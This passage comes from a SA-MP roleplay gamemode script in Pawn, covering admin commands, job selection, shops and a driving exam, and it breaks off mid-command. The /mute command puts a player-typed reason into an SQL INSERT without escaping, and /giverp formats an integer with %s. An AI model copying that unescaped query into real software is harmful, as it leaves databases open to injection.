    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
			new money,id,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "ui",id,money)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/setlevel <Name/Playerid> <Level>");
	    	new year, month,day;
	    	getdate(year, month, day);
		    if(IsPlayerConnected(id))
		    {
				PlayerInfo[id][pLevel] = money;
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* Admin %s has set your level to %d.", sendername,money);
				SendClientMessage(id, COLOR_LIGHTBLUE, string);
				format(string, 256, "{ba9789}Warning: Admin %s has set %d level %s.", sendername,money,giveplayer);
				ABroadCast(COLOR_SERVER,string,5);
				Update(id, pLevelx);
				SetPlayerScore(id, PlayerInfo[id][pLevel]);
			}
	    	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	return 1;
}
CMD:giverp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
			new money,id,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "ui",id,money)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/giverp <Name/Playerid> <Respect>");
	    	new year, month,day;
	    	getdate(year, month, day);
		    if(IsPlayerConnected(id))
		    {
				PlayerInfo[id][pExp] += money;
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* Admin %s has given you %s RP.", sendername,money);
				SendClientMessage(id, COLOR_LIGHTBLUE, string);
				format(string, 256, "{ba9789}Warning: Admin %s has send %d respect points to %s.", sendername,money,giveplayer);
				ABroadCast(COLOR_SERVER,string,5);
				Update(id, pRP);
			}
	    	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	return 1;
}
CMD:givemoney(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
			new money,id,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "ui",id,money)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/givemoney <Name/Playerid> <Amount of Money>");
		    if(IsPlayerConnected(id))
		    {
				GivePlayerCash(id, money);
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* Admin %s has given you $%s.", sendername,FormatNumber(money));
				SendClientMessage(id, COLOR_LIGHTBLUE, string);
				format(string, 256, "{ba9789}Warning: Admin %s has send money %s to %s.", sendername,FormatNumber(money),giveplayer);
				ABroadCast(COLOR_SERVER,string,5);
				format(string, 256, "Warning: Admin %s has send money %s to %s.", sendername,FormatNumber(money),giveplayer);
				Adminlog(string);
				Update(id, pCashx);
			}
	    	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	return 1;
}
CMD:mute(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 3)
		{
			new time,id,string[256],sendername[25],giveplayer[25],reason[250],str[256];
			if(sscanf(params, "uis[250]",id,time,reason)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/mute <Name/Playerid> <Time(minutes)> <Reason>");
		    if(IsPlayerConnected(id))
		    {
				PlayerInfo[id][pMuted] = 1;
				PlayerInfo[id][pMuteTime] = time*60;
			    GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* You were muted by Admin %s for %d minutes, reason: %s.", sendername,time,reason);
				SendClientMessage(id, COLOR_ERROR, string);
				format(string, sizeof(string), "{FF6347}[Admin-Warn]: {FFFFFF}%s has been muted by %s for %d minutes, reason: %s.", giveplayer, sendername,time, reason);
				SendClientMessageToAll(COLOR_AdminWarn, string);
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Muted`='1',`MuteTime`='%d' WHERE `name`='%s'",PlayerInfo[id][pMuteTime],PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
				new var100[256];
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','7','%d','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],time,reason,giveplayer,sendername);
				mysql_tquery(SQL,var100,"","");
			}
	    	else
	    	{
	    		SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	    	}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:unmute(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2)
		{
			new id,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/unmute <Name/Playerid>");
		    if(IsPlayerConnected(id))
		    {
		    	PlayerInfo[id][pMuted] = 0;
				PlayerInfo[id][pMuteTime] = 0;
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* You were unmuted by Admin %s.", sendername);
				SendClientMessage(id, COLOR_ERROR, string);
				format(string, sizeof(string), "{ba9789}Warning: Admin %s unmuted %s.", sendername,giveplayer);
				ABroadCast(COLOR_SERVER,string,3);
				new string2[184];
			    mysql_format(SQL, string2, sizeof(string2), "UPDATE users SET `Muted`='0',`MuteTime`='0' WHERE `name`='%s'",PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,string2,"","");
			}
	    	else
	    	{
	    		SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	    	}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:mutedplayers(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
	        new count = 0,string[250],giveplayer[25];
			SendClientMessage(playerid, COLOR_SERVER, "{ADFF5C}|___Muted Players___|");
		    foreach(Player,i)
			{
				if(IsPlayerConnected(i))
				{
				    if(PlayerInfo[i][pMuted] == 1)
				    {
					    GetPlayerName(i, giveplayer, sizeof(giveplayer));
				        format(string, sizeof(string), "%s(%d) - Mute time left: %d.",giveplayer,i,PlayerInfo[i][pMuteTime]);
						SendClientMessage(playerid,COLOR_SERVER,string);
						count++;
					}
				}
			}
			if(count == 0)
			{
	    		SendClientMessage(playerid,COLOR_ERROR,"* Currently no muted players online.");
			}
	    	else if(count == 1)
  	    	{
		    	SendClientMessage(playerid,COLOR_ERROR,"* Now are 1 muted player online.");
	    	}
	    	else if (count >= 2)
	    	{
		    	format(string, sizeof(string), "* Now are %d muted players online.", count);
		        SCM(playerid, COLOR_ERROR, string);
	    	}
		}
	    else
	    {
           SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	    }
	}
	return 1;
}
CMD:getjob(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        new sendername[25],str[256];
		GetPlayerName(playerid,sendername,sizeof(sendername));
		if(PlayerInfo[playerid][pJob] == 0)
		{
		    if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1365.8931,-1289.0779,13.5469))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Arms Dealer.");
			    PlayerInfo[playerid][pJob] = 9;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='9' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2165.5444,-1674.6372,15.0822))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Drugs Dealer.");
			    PlayerInfo[playerid][pJob] = 4;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='4' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1973.3063,-1304.7975,20.8316))
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Pocket Thief.");
			    PlayerInfo[playerid][pJob] = 15;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='15' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,-382.8534,-1426.2845,26.2880))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Farmer.");
			    PlayerInfo[playerid][pJob] = 6;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='6' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1450.3951,-2286.9661,13.5469))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Bus Driver.");
			    PlayerInfo[playerid][pJob] = 7;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='7' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2503.0581,2778.7229,10.8203))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Garbage.");
			    PlayerInfo[playerid][pJob] = 10;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='10' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1474.2523,-1771.2463,18.7958))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Detective.");
			    PlayerInfo[playerid][pJob] = 1;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='1' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2850.9663,891.8728,10.7500))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Car Jacker.");
			    PlayerInfo[playerid][pJob] = 2;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='2' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,910.8003,-1231.9697,16.9766))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Jobul tau este acum Mechanic.");
			    PlayerInfo[playerid][pJob] = 8;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='8' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,2123.0237,-1788.8237,13.5547))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Pizza Boy.");
			    PlayerInfo[playerid][pJob] = 5;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='5' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,840.9308,-2066.2319,12.8672))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Fisherman.");
			    PlayerInfo[playerid][pJob] = 13;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='13' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,-76.8129,-1136.6630,1.0781))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Trucker.");
			    PlayerInfo[playerid][pJob] = 14;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='14' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1154.3644,-1181.1787,32.8187))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Courier.");
			    PlayerInfo[playerid][pJob] = 16;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='16' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,816.6126,857.0764,12.7891))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Cement Carrier.");
			    PlayerInfo[playerid][pJob] = 17;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='17' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else if (GetPlayerState(playerid) == 1 && PlayerToPoint(3.0, playerid,1972.4215,-1358.8444,14.1548))
			{
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your job is now Worker Career.");
			    PlayerInfo[playerid][pJob] = 18;
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Job`='18' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}

		}
		else
		{
		    SendClientMessage(playerid, COLOR_ERROR, "You already have a job! Use first order /quitjob.");
		}
	}
    return 1;
}
CMD:quitjob(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
	    if(PlayerInfo[playerid][pJob] >= 1)
	    {
		    SendClientMessage(playerid, COLOR_GREY, "You have quit your job!");
		    PlayerInfo[playerid][pJob] = 0;
		    UsedFind[playerid] = 0;
			foreach(Player, i)
			{
				if(IsACop(playerid))
				{
					if(caser[playerid] == i)
					{
						cased[i] --;
						caser[playerid] = 1001;
					}
				}

			}
			GotoMats[playerid] = 0;
			if(IsATruck(GetPlayerVehicleID(playerid)))
			{
			    RemovePlayerFromVehicle(playerid);
	    		restruck[playerid] = SetTimerEx("RespawnTruck", 1, 0, "i",playerid);
			}
			if(IsAFarmer(GetPlayerVehicleID(playerid)) || IsAGarbageTruck(GetPlayerVehicleID(playerid)) || IsABus(GetPlayerVehicleID(playerid)))
			{
				RemovePlayerFromVehicle(playerid);
			}
			if(IsCollectingRubbish[playerid] > 0)
			{
				PlayerInfo[playerid][pGarbageTime] = 0;
		    	IsCollectingRubbish[playerid] = 0;
		    	PlayerTextDrawHide(playerid, gunoierr[playerid]);
			}
			if(farmerc[playerid] == 1)
			{
				farmerc[playerid] = 0;
				farmertime[playerid] = 1;
				PlayerTextDrawHide(playerid, farmjob[playerid]);
				PlayerTextDrawHide(playerid, farmbox[playerid]);
				PlayerTextDrawHide(playerid, farmtime[playerid]);
				PlayerTextDrawHide(playerid, farmspeed[playerid]);
				PlayerTextDrawHide(playerid, farmwanted[playerid]);
				KillTimer(timerfarmm[playerid]);
			}
			if(CarJacker[playerid] > 0)
			{
		    	CarJacker[playerid] = 0;
		    	JackAcc[playerid] = 0;
			}
			if(Trucker[playerid] >= 1)
			{
			    RemovePlayerFromVehicle(playerid);
		   		Trucker[playerid] = 0;
	        	Trucker2[playerid] = 0;
	        	DestroyVehicle(viddd[playerid]);
	        	viddd[playerid] = 0;
	        	SetVehicleToRespawn(TruckID[playerid]);
	        	TruckID[playerid] = 0;
	    		restruck[playerid] = SetTimerEx("RespawnTruck", 1, 0, "i",playerid);
			}
			if(busc[playerid] == 1)
			{
		    	busc[playerid] = 0;
		    	PlayerTextDrawHide(playerid, BusJob[playerid]);
		    	PlayerTextDrawHide(playerid, BusCheck[playerid]);
		    	KillTimer(timerbus[playerid]);
		    	if(JobStep[playerid] >= 1)
		    	{
      				JobStep[playerid] = 0;
	    			GivePlayerCash(playerid, -2500);
		    		SendClientMessage(playerid, COLOR_GREEN, "(-) You paid $2.500 the company buses duty.");
				}
			}
			if(MatsHolding[playerid] > 0)
			{
			    MatsHolding[playerid] = 0;
			}
			if(CheckBus[playerid] > 0)
			{
			    busc[playerid] = 0;
				CheckBus[playerid] = 0;
			}
			if(CP[playerid] == 34)
			{
			    new towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
				SetVehicleToRespawn(towedcar);
				CP[playerid] = 0;
			}
			if(MechanicCallTime[playerid] > 0)
			{
			    MechanicCallTime[playerid] = 0;
			}
			if(TaxiCallTime[playerid] > 0 && TaxiAccepted[playerid] < 999)
			{
	    		TaxiAccepted[playerid] = 999;
				TaxiCallTime[playerid] = 0;
			}
			CP[playerid] = 0;
			pizzaj[playerid] = 0;
			pizzatime[playerid] = 0;
			failpizza[playerid] = -1;
			PizzaCP[playerid] = 0;
			pizzaprize[playerid] = 0;
			DisablePlayerRaceCheckpoint(playerid);
			DisablePlayerCheckpoint(playerid);
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`Job`='0' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,str,"","");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You don't have a job.");
	}
	return 1;
}
CMD:jaillist(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
	        new count = 0,string[250],giveplayer[25];
			SendClientMessage(playerid, COLOR_SERVER, "{ADFF5C}|___Jailed Players___|");
		    foreach(Player,i)
			{
				if(IsPlayerConnected(i))
				{
				    if(PlayerInfo[i][pJailed] >= 1)
				    {
					    GetPlayerName(i, giveplayer, sizeof(giveplayer));
				        format(string, sizeof(string), "%s(%d) - Jailed time left: [%d]",giveplayer,i,PlayerInfo[i][pJailTime]);
						SendClientMessage(playerid,COLOR_SERVER,string);
						count++;
					}
				}
			}
			if(count == 0)
			{
	    		SendClientMessage(playerid,COLOR_ERROR,"* Currently no jailed players online.");
			}
	    	else if(count == 1)
  	    	{
		    	SendClientMessage(playerid,COLOR_ERROR,"* Now are 1 jailed player online.");
	    	}
	    	else if (count >= 2)
	    	{
		    	format(string, sizeof(string), "* Now are %d jailed players online.", count);
		        SCM(playerid, COLOR_ERROR, string);
	    	}
		}
	    else
	    {
           SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	    }
	}
	return 1;
}
CMD:activity(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new strsql[1000];
	new nume[60];
	new rezultat[128];
	new pp,rp,hidden;
	mysql_format(SQL, strsql, sizeof(strsql), "SELECT * FROM `celmaiactivjucator` WHERE `id`='1'");
	new Cache: verificare = mysql_query(SQL, strsql);
	for(new i, j = cache_get_row_count(); i != j; i++)
	{
		pp = cache_get_field_content_int(i, "premiupp");
		rp = cache_get_field_content_int(i, "premiurp");
		hidden = cache_get_field_content_int(i, "premiuhidden");
		cache_get_field_content(i, "nume", rezultat); format(nume, sizeof(nume), rezultat);
	}
	cache_delete(verificare);
	format(MGLOBAL, sizeof(MGLOBAL), "\t\t{0066FF}(!){FFFFFF}This event was created to reward active players on the server.\n\n\
	{0066FF}(!){FFFFFF}Every Sunday at 23:00 server will choose the most active player of the week.\n{0066FF}(!){FFFFFF}It will be awarded a prize random, like sons (x Points Premium x points Respect, x Colors Hidden).\n");
	format(MGLOBAL, sizeof(MGLOBAL), "%s{0066FF}(!){FFFFFF}The most active player will receive prize whether active or inactive.\n{0066FF}(!){FFFFFF}After award, the server will send a notification which will specify what won.\n\n",MGLOBAL);
	format(MGLOBAL, sizeof(MGLOBAL), "%s{0066FF}(!){FFFFFF}The most active player of the week is: {0066FF}%s\n{FFFFFF}PPremium points won: {0066FF}%d{FFFFFF}\tRespect points won: {0066FF}%d{FFFFFF}\tHidden colors won: {0066FF}%d{FFFFFF}",MGLOBAL, nume, pp,rp,hidden);
	ShowPlayerDialog(playerid, DIALOG_ACTIVITY, DIALOG_STYLE_MSGBOX, "SERVER: Activity Event", MGLOBAL, "OK", "");
	return 1;
}
CMD:exam(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "You can't use this command when you are in a car.");
    if(PlayerToPoint(5.0,playerid, 388.5289,-1524.0131,32.2734))
    {
		new string[256];
    	if(PlayerInfo[playerid][pCarLic] == 0)
     	{
			if(PlayerInfo[playerid][pCarLicSuspend] > 0)
			{
				format(string,sizeof(string),"Your driver's license was suspended recently. You can give the exam after %d hours.",PlayerInfo[playerid][pCarLicSuspend]);
				SendClientMessage(playerid, COLOR_GREY, string);
				return 1;
			}
      		if(TakingLesson[playerid] == 0)
        	{
		    	TakingLesson[playerid] = 1;
       			examcar[playerid] = CreateVehicle(410, 376.1654,-1512.2129,32.2397,303.8565,1,1, -1);
				Gas[examcar[playerid]] = 100;
				PutPlayerInVehicleEx(playerid, examcar[playerid], 0);
				DisableRemoteVehicleCollisions(playerid, 1);
				SendClientMessage(playerid, COLOR_SERVER, "Examination began. Go to Checkpoint.");
				SendClientMessage(playerid, COLOR_SERVER, "Write /engine or press 2 to start the car engine.");
			    CP[playerid] = 100;
			    PlayerTextDrawShow(playerid, DMVexam[playerid]);
				format(string, sizeof(string), "~w~CHECKPOINTS: ~r~0~w~/~r~8");
				PlayerTextDrawSetString(playerid, DMVcheck[playerid], string);
				PlayerTextDrawShow(playerid, DMVcheck[playerid]);
				SetPlayerRaceCheckpoint(playerid,0, 417.9525,-1481.5820,30.3090,440.3362,-1498.8708,30.5744,4.0);
				new engine,lights,alarm,doors,bonnet,boot,objective;
				GetVehicleParamsEx(examcar[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
		      	SetVehicleParamsEx(examcar[playerid],engine,lights,alarm,1,bonnet,boot,objective);
			}
   			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}You already have test.");
      	}
       	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}You already have a drivers license.");
    }
   	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}You are not at the DMV.");
	return 1;
}
CMD:buy(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 6)
		{
			ShowPlayerDialog(playerid,Dialog_24,DIALOG_STYLE_LIST,"SERVER: 24/7","Cellphone ($500)\nPhone Book ($50)\nPhone Credit ($500)\nWalkie Talkie ($2,500)\nPhoto Camera ($2,000)\nGas Can ($5,000)","Select","Exit");
			return 1;
		}
	}
    return 1;
}
CMD:buyfightstyle(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 8)
		{
			ShowPlayerDialog(playerid,Dialog_Gym,DIALOG_STYLE_LIST,"SERVER: Fighting Styles","Boxing ($6,000)\nKung Fu ($10,000)\nKnee Head ($10,000)\nGrab & Kick ($10,000)\nElbow ($10,000)\nDefault ($2,000)","Select","Cancel");
			return 1;
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You are not at gym.");
	}
    return 1;
}
CMD:buytoys(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(InBussines[playerid] > 0)
	{
		if(BizzInfo[InBussines[playerid]][bType] == 4)
		{
			ShowPlayerDialog(playerid,DIALOG_SEXSHOP,DIALOG_STYLE_LIST,"SERVER: Sex Shop","Purple Dildo ($100)\nSmall White Vibrator ($100)\nSilver Vibrator ($100)\nLarge White Vibrator ($100)\nFlowers ($150)","Select","Exit");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You are not at sex shop.");
	}
	return 1;
}
CMD:buydrink(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(InBussines[playerid] > 0)
	{
	    if(BizzInfo[InBussines[playerid]][bType] == 3)
	    {
	        ShowPlayerDialog(playerid,DIALOG_BAR,DIALOG_STYLE_LIST,"SERVER: Bar","Stock Bar Cigars ($50)\nSprunk ($50)\nBeer ($60)\nWine ($100)","Select","Exit");
        }
        else return SendClientMessage(playerid, COLOR_SERVER, "You are not at bar.");
    }
    return 1;
}
CMD:ncolors(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pColors] < 1) return SendClientMessage(playerid, COLOR_ERROR, "You have bought your nickname colors.");
	if(PlayerInfo[playerid][pMember] > 0) return SCM(playerid, COLOR_ERROR, "You can not use this command because you are in faction.");
	ShowPlayerDialog(playerid, DIALOG_NCOLORS, DIALOG_STYLE_LIST, "Nickname colors", "{FFC363}Orange\n{CF4DFF}Violet\n{4DA0FF}Blue\n{4DEDFF}Aqua\n{B1FF14}Lime\n{FF54E5}Pink", "Select", "CANCEL");
	return 1;
}
CMD:shop(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pConnectTime] < 0) return SCM(playerid, COLOR_ERROR, "Ai nevoie de minim o ora jucate.");
    {
        new titlestring[MAX_STRING],string2[MAX_STRING],string3[MAX_STRING],string4[MAX_STRING],string5[MAX_STRING],string6[MAX_STRING],string7[MAX_STRING],iString[1500],string8[MAX_STRING];
  		format(titlestring, sizeof(titlestring), "Premium points: {FFFF00}%d", PlayerInfo[playerid][pPremiumPoints]);
  		format(string2, sizeof(string2), "{FFFFFF}Premium account - {E8E40C}80{FFFFFF} premium points\n{FFFFFF}Change Nickname - {E8E40C}20{FFFFFF} premium points");
  		format(string3, sizeof(string3), "{FFFFFF}Clear 10 FP - {E8E40C}20{FFFFFF} premium points\n{FFFFFF}Clear 20 FP - {E8E40C}40{FFFFFF} premium points");
  		format(string4, sizeof(string4), "{FFFFFF}Clear warns - {E8E40C}20{FFFFFF} premium points\n{FFFFFF}Create Clan - {E8E40C}100{FFFFFF} premium points");
  		format(string5, sizeof(string5), "{FFFFFF}Vehicle hidden color - {E8E40C}20{FFFFFF} premium points\n{FFFFFF}20x fireworks - {E8E40C}5{FFFFFF} premium points");
  		format(string6, sizeof(string6), "{FFFFFF}iPhone - {E8E40C}15{FFFFFF} premium points\n{FFFFFF}Clear KM & Distance traveled for a vehicle - {E8E40C}20{FFFFFF} premium points");
  		format(string7, sizeof(string7), "{FFFFFF}Buy $300,000 - {E8E40C}1{FFFFFF} premium points\n{FFFFFF}Buy $3,000,000 - {E8E40C}10{FFFFFF} premium points\n{FFFFFF}Buy $15,000,000 - {E8E40C}50{FFFFFF} premium points\n{FFFFFF}Buy $30,000,000 - {E8E40C}100{FFFFFF} premium points\n");
  		format(string8, sizeof(string8), "{FFFFFF}Buy MP3 - {E8E40C}20{FFFFFF} premium points\nNickname color - {E8E40C}20{FFFFFF} premium points");
  		format(iString, sizeof(iString), "%s\n%s\n%s\n%s\n%s\n%s\n%s\n%s", string2, string3, string4, string5, string6, string7, string8);
	 	ShowPlayerDialog(playerid,DIALOG_SHOP,DIALOG_STYLE_LIST, titlestring, iString, "Buy","Exit");
    }
    return 1;
}
CMD:giveallpp(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 7)
	{
		new moneyall,sendername[MAX_PLAYER_NAME],string[150];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "i",moneyall)) return SCM(playerid, 0xFFFFFFFF, "Tasteaza: /giveallpp <pp>");
		if(moneyall > 1000) return SCM(playerid, 0xF0F8FFFF, "Error: Too much pp.");
		else if(moneyall <= 1000)
		{
